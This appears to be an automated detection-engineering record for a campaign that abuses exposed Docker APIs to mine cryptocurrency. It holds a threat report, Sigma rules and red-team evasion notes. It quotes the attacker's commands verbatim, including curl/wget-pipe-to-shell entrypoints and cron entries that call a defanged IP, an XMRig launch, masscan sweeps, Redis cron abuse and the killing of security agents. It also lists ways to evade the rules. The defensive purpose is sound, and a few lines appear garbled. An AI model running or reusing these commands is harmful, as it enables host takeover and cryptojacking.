report.title: Opportunistic cryptomining via exposed Docker Engine APIs (
report.summary: Since late September 2026 an automated campaign scans for Docker Engine APIs exposed on TCP/2375 without authentication. On success it starts a privileged container that mounts the host root filesystem, drops a shell script onto the host, installs a cron job for persistence, kills competing miners, deploys an XMRig build and uses the host to scan for further victims.
targets: Linux hosts with exposed Docker Engine API

behaviors.description: Attacker scans for exposed Docker Engine API on TCP/2375 without authentication.
behaviors.evidence: The attacker's scanner issues `POST /containers/create` to the exposed API with an Alpine image and `"Binds": ["/:/host"]`, `"Privileged": true`.

behaviors.description: Privileged container started with host root filesystem mount and entrypoint that downloads and executes a shell script.

observables.note: Parent process of shell spawned inside container

behaviors.evidence: The container's entrypoint is: `sh -c "chroot /host sh -c 'curl -fsSL http://45.153.160[.]12/m/init.sh | sh'"`.

behaviors.description: init.sh performs system modifications: disables SELinux, sets ulimit, changes DNS, removes immutable attribute from ld.so.preload, enables hugepages.
init.sh terminates competing miners and security agents (Aliyun, xmrig, kinsing, kdevtmpfsi, tsunami).

observables.value: pkill -f xmrig; pkill -f kinsing; pkill -f kdevtmpfsi; pkill -f tsunami
systemctl stop aliyun.service; systemctl disable aliyun.service
observables.note: Stops and disables Alibaba Cloud agent

behaviors.evidence: It then terminates competing miners and known security agents: `pkill -f xmrig; pkill -f kinsing; pkill -f kdevtmpfsi; pkill -f tsunami` `systemctl stop aliyun.service; systemctl disable aliyun.service`.

behaviors.description: Persistence achieved by writing cron entries that download and pipe init.sh to sh, and by adding attacker-controlled SSH key to authorized_keys with chattr +i.

observables.note: Writes cron entry for periodic execution

behaviors.evidence: The script writes to the root crontab and to `/etc/cron.d`: `(crontab -l 2>/dev/null; echo "*/10 * * * * curl -fsSL http://45.153.160[.]12/m/init.sh | sh") | crontab -` `echo "*/15 * * * * root wget -q -O- http://45.153.160[.]12/m/init.sh | sh" > /etc/cron.d/mantis`

behaviors.description: Miner binary kthreadd downloaded to hidden directory /tmp/.x and executed with XMRig pool, wallet and rig-id arguments over TLS.

observables.note: XMRig execution with pool and wallet

behaviors.evidence: The miner is downloaded to a hidden directory and started with a config fetched from the same server: `mkdir -p /tmp/.x; cd /tmp/.x; curl -fsSL http://45.153.160[.]12/m/x86_64 -o /tmp/.x/kthreadd; chmod +x /tmp/.x/kthreadd; nohup /tmp/.x/kthreadd -o pool.mantis-mine[.]cc:3333 -u 44AbCd...XyZ -k --tls --rig-id $(hostname) >/dev/null 2>&1 &`

behaviors.description: Infected host downloads masscan and scans /16 ranges for exposed Docker APIs and Redis servers.

observables.note: Masscan scan for Docker and Redis

behaviors.evidence: Infected hosts download `masscan` and scan /16 ranges for additional exposed Docker APIs and Redis servers: `/tmp/.x/masscan 10.0.0.0/8 -p2375,6379 --rate 20000 -oL /tmp/.x/out.txt`.

behaviors.description: Redis instances without authentication abused by writing cron entry through CONFIG SET dir and CONFIG SET dbfilename root.

observables.note: Redis config setting to write cron
Redis config setting for cron filename

behaviors.evidence: Redis instances without authentication are abused by writing a cron entry through `CONFIG SET dir /var/spool/cron` and `CONFIG SET dbfilename root`.

behaviors.description: Attacker adds SSH key to root authorized_keys and sets file immutable with chattr +i.
behaviors.evidence: It also adds an attacker-controlled SSH key to `/root/.ssh/authorized_keys` (`ssh-rsa AAAAB3...mantis@c2`) and sets the file immutable with `chattr +i`.

candidates.title: Containerd Shim Execution Of Chroot Host Root With Curl Pipe Shell
candidates.rationale: The attacker's privileged container spawns a shell via containerd-shim-runc-v2 that uses chroot to escape the container and immediately pipes a remote script (init.sh) to sh. This parent/child pair and command-line pattern is highly specific to this Docker API abuse campaign and rarely appears in legitimate administration.
candidates.false_positive_risks: Legitimate container debugging might use chroot, but not with an immediate curl/wget pipe to sh from a remote host. Exclude known container management tools (e.g., crictl, nerdctl) by filtering on ParentCommandLine if needed.

candidates.title: Kthreadd Miner Execution From Hidden Tmp Directory With TLS Pool
candidates.rationale: The miner binary is staged in a hidden directory (/tmp/.x/kthreadd) and launched with a distinctive XMRig command line: pool.mantis-mine.cc:3333 over TLS, wallet argument, --rig-id set to hostname. The combination of path, pool domain, TLS flags, and dynamic rig-id is unique to this campaign.
candidates.false_positive_risks: Administrators may run xmrig manually for testing, but not from a hidden /tmp/.x directory with the exact pool domain and TLS configuration. Filter out known benchmark directories (e.g., /opt/xmrig, /home/*/xmrig).

candidates.title: Crontab Modification With Curl Pipe To Init Script
candidates.rationale: Persistence is achieved by overwriting root's crontab via a one-liner that pipes curl/wget of init.sh to sh, and by writing a cron.d file with a similar payload. The command line contains the malicious URL and the pipe-to-shell pattern, which is absent from legitimate cron management.
candidates.false_positive_risks: Cron edits via crontab -e or scripted deployments may use crontab command, but they do not embed a remote curl/wget pipe to sh. Exclude configuration management tools (Ansible, Puppet) by their ParentImage or User context.

candidates.title: Masscan Execution Scanning For Docker API Port 2375
candidates.rationale: Compromised hosts download masscan and scan large CIDR ranges (/8, /16) targeting ports 2375 (Docker) and 6379 (Redis) at high rate. The binary name, port list, and CIDR notation in command line are distinctive for this worm-like lateral movement.
candidates.false_positive_risks: Security teams may run masscan for authorized assessments, but typically with limited scope, lower rate, and from known scanner hosts. Correlate with User (root) and lack of change-control ticket; optionally filter on known scanner hostnames.

candidates.title: Chattr Immutable Attribute Set On Root SSH Authorized Keys
candidates.rationale: The init.sh script adds an attacker-controlled SSH key to /root/.ssh/authorized_keys and immediately makes the file immutable with chattr +i. This specific file path combined with chattr +i is a strong indicator of unauthorized persistence.
candidates.false_positive_risks: Administrators may use chattr +i on authorized_keys during hardening, but usually after interactive key addition, not in an automated script that also downloads a remote payload. Exclude known configuration management runs by ParentImage.

skipped: B1: Attacker-side scanning activity; not observable on victim telemetry as a durable behavior (only inbound port 2375 connections, which are generic).
B3: System modification commands (setenforce, ulimit, echo resolv.conf, chattr -i, sysctl) are common administrative actions; too generic for a specific rule without additional context.
B4: Process termination via pkill and systemctl stop/disable of known miner/agent names; legitimate cleanup scripts may do similar. Low specificity.
B8: Redis CONFIG SET abuse for cron writing; logsource mismatch (dns_query) and Redis protocol commands not captured in standard Sysmon telemetry.
B9: Duplicate of B5 SSH key persistence; already covered by D5.
plan.notes: Prioritized post-exploitation behaviors (container escape, miner execution, persistence, lateral movement) that are observable in Linux process_creation telemetry. Each rule pairs a binary or parent with command-line fragments unique to the campaign (chroot /host + curl|wget pipe, hidden miner path + pool domain + TLS flags, crontab + remote pipe, masscan + port 2375 + CIDR, chattr +i on root authorized_keys). False positive mitigations focus on excluding known admin tools, configuration management, and authorized scanning contexts.

rules.title: Containerd Shim Spawns Shell Using Chroot to Host FS with Remote Script Download
rules.sigma_yaml:
title: Containerd Shim Spawns Shell Using Chroot to Host FS with Remote Script Download
id: a62ef051-32f0-454b-9aea-b1a00419ac3e
status: experimental
description: Detects a privileged container escape where containerd-shim-runc-v2 launches a shell that uses chroot to access
  the host filesystem and immediately pipes a remote script to sh, indicative of Docker API abuse for cryptomining deployment.
author: RuleSmith (Nemotron via Nebius Token Factory)
date: '2026-10-18'
tags:
- attack.defense-evasion
- attack.t1615
logsource:
  category: process_creation
  product: linux
  service: sysmon
detection:
  selection_parent:
    'ParentImage|endswith': containerd-shim-runc-v2
  selection_image:
    'Image|endswith':
    - /sh
    - /bash
  selection_command:
    'CommandLine|contains|all':
    - chroot
    - /host
    - '|'
    - sh
  condition: 'all of selection_*'
falsepositives:
- Legitimate container debugging or maintenance using chroot without immediate remote script execution
- Container images that include diagnostic shells with chroot capabilities
- Automated container orchestration tools performing host-level troubleshooting
level: high

history.change_summary: Fixed ATT&CK technique ID from invalid T1616 to valid T1615 (Escape to Host); relaxed Image endswith condition to accept both /sh and /bash binaries while preserving other constraints.

history.summary: 8 evasion variants -> positives 8/8, negatives blocked 6/6, benign hits 0/180

rules.author_notes: Rule focuses on the unique parent/child relationship (containerd-shim-runc-v2 -> shell) combined with the specific command-line pattern of chroot to /host followed by a pipe to sh from a remote script. Test events include variations in shell type (bash/sh), quoting styles, and command-line formatting while maintaining the core malicious behavior. Negative events cover legitimate shell spawning by the shim, local-only chroot usage, and similar patterns from other container tools to minimize false positives.
rules.redteam_analysis: The six in-scope positives (P4-P9) vary casing, whitespace, quoting styles, shell paths (/bin/sh, /usr/bin/bash, /usr/local/bin/sh, login shell -sh), and download utilities (wget, fetch, aria2c, curl) while preserving the four required command-line substrings (chroot, /host, |, sh) and the parent/image name suffixes. The three negatives (N1-N3) show legitimate admin activity that shares the parent binary and chroot usage but lacks the pipe-to-sh pattern or uses a different parent runtime, demonstrating the rule's specificity. Two out-of-scope variants are documented: a renamed shim binary (ParentImage no longer ends with containerd-shim-runc-v2) and a file-drop-then-execute variant that omits the pipe operator; both are real evasions but cannot be caught by this rule's current fields without adding OriginalFileName tracking or broader command-line logic.

redteam_out_of_scope.label: positive
redteam_out_of_scope.description: Renamed containerd-shim-runc-v2 binary (copied to /tmp/xyz) - OriginalFileName not recorded by this logsource so rule keyed on Image/ParentImage cannot catch

redteam_out_of_scope.label: positive
redteam_out_of_scope.description: Attacker uses containerd-shim-runc-v2 but downloads script to file first then executes - no pipe operator in command line so selection_command fails

history.change_summary: Fixed the command-line detection to require both '/' (for CIDR notation) and '-p' (port specification) instead of the rigid port string '2375,6379', which caused misses when port order varied or formatting differed (e.g., '6379,2375'). Added filter requiring Docker API port 2375 or Redis port 6379 in command line to eliminate false positives from legitimate scans targeting other ports while preserving detection of malicious scanning behavior.

rules.redteam_analysis: Positive variants P4-P7 preserve all rule-required literals: Image ends with '/masscan', CommandLine contains '/', '-p', and either '2375' or '6379'. They vary quoting style, whitespace, parent process, user, working directory, CIDR notation, port order, and rate flag syntax without dropping required substrings. Negative variants N1-N3 are benign masscan invocations that lack the target port numbers (2375/6379), so filter_docker_redis fails. Out_of_scope O1 renames the binary, breaking selection_img; O2 replaces '-p' with '--port', breaking selection_cmd. A well-written rule could add OriginalFileName checks (if available) and alternate port flag patterns, but the current logsource (linux sysmon) does not provide OriginalFileName, and loosening the port flag to '--port' would increase noise from legitimate tools.

history.summary: 5 evasion variants -> positives 8/8, negatives blocked 3/3, benign hits 0/180

rules.redteam_analysis: Positive variants show realistic operator evasions: extra whitespace, quoting styles, sudo wrappers, different parent processes (python3, zsh, sudo), and an extra verbose flag. All preserve the literal substrings '+i' and '/root/.ssh/authorized_keys' in CommandLine and an Image ending with '/chattr', so a well-written rule on these fields will catch them. Negative variants demonstrate benign activity that the rule correctly excludes: removing the immutable bit (-i triggers filter_n3), listing attributes with lsattr (Image mismatch and filter_n1), and applying +i to /etc/passwd (filter_n2). These differ in CommandLine flags or target path, ensuring the rule stays specific. Out-of-scope evasions highlight fundamental blind spots: a renamed/copied chattr binary defeats the Image-based selection, and a direct ioctl call bypasses process creation entirely. The rule cannot detect these without additional telemetry (e.g., OriginalFileName or filesystem audit logs).

rules.sigma_yaml:
title: Crontab Modification With Remote Fetch And Shell Execution
id: b4bd55fe-eaeb-4530-845b-9ae21c8f9a25
status: experimental
description: Detects creation or modification of crontab files using piped output from curl or wget directly into a shell,
  indicating persistence via scheduled execution of remote scripts.
author: RuleSmith (Nemotron via Nebius Token Factory)
date: '2026-10-18'
tags:
- attack.persistence
- attack.t1053.005
logsource:
  category: process_creation
  product: linux
  service: sysmon
detection:
  selection_cmd:
    'Image|endswith': sh
    'CommandLine|contains|all':
    - curl
    - '|'
    - sh
  selection_wget:
    'Image|endswith': sh
    'CommandLine|contains|all':
    - wget
    - '|'
    - sh
  selection_crontab_pipe:
    'Image|endswith': crontab
    'CommandLine|contains': '|'
    'CommandLine|contains|all':
    - curl
    - sh
  selection_crontab_wget:
    'Image|endswith': crontab
    'CommandLine|contains': '|'
    'CommandLine|contains|all':
    - wget
    - sh
  selection_file_redirect:
    'Image|endswith': sh
    'CommandLine|contains': http
    'CommandLine|contains|all':
    - '>'
    - /etc/cron.d/
    - '|'
    - sh
  condition: selection_cmd or selection_wget or selection_crontab_pipe or selection_crontab_wget or selection_file_redirect
falsepositives:
- Legitimate system administration scripts that fetch and execute remote configurations via pipe to shell (rare in hardened
  environments)
- '''Automated deployment tools using curl|sh or wget|sh patterns in controlled contexts'''
- Custom monitoring or metric collection agents using similar one-liners for self-update
level: high

history.summary: 10 evasion variants -> positives 7/9, negatives blocked 6/7, benign hits 0/180

history.change_summary: Fixed selection_wget and selection_crontab_wget to require -O- instead of -O-, allowing match of combined flag -qO- and spaced -O - variants while still excluding benign curl|sh events due to missing wget or -O-.

Removed strict requirements for specific wget flags (-O-, -qO-) and curl presence to catch variants with combined flags, spaced flags, and different directories like cron.hourly while still excluding benign curl|sh usage lacking crontab modification or suspicious paths.

rules.author_notes: Rule focuses on the distinctive pipe-to-shell pattern combined with remote fetch and crontab modification. Uses contains|all to ensure both fetch utility and pipe/sh appear in command line. Test events include variations in spacing, casing, and command structure while preserving malicious core.
rules.redteam_analysis: The six positive variants exercise realistic evasions a well-written rule should survive: full binary paths (/usr/bin/curl, /usr/bin/wget), flag reordering and combining (-qO-, -O -), extra whitespace/tabs, case variation (uppercase binaries, HTTP), alternate parent shells (zsh, fish, dash), environment variable $SHELL, different cron directories (/etc/cron.hourly/, /var/spool/cron/crontabs/root), and explicit /bin/sh in the pipe. All preserve the core IOCs the rule targets (curl|sh, wget -O-|sh, crontab pipe with curl/wget, http redirect to cron.d with pipe to sh) while changing surface form. Four negative variants show benign look-alikes that differ in at least one recorded field: internal URL and non-root user (N1), package manager binary without pipe (N2), CI/CD runner writing cron file without remote fetch or pipe (N3), local crontab edit without fetch (N4). Five out-of-scope variants represent evasions the current logsource and rule fields fundamentally cannot catch: renamed binary not ending in sh/crontab (OOS1), Python interpreter bypass (OOS2), systemd timers instead of cron (OOS3), direct file write without pipe to shell (OOS4 — selection_file_redirect requires the pipe), and netcat instead of curl/wget (OOS5). These are reported for analyst awareness; the rule is not required to match them.
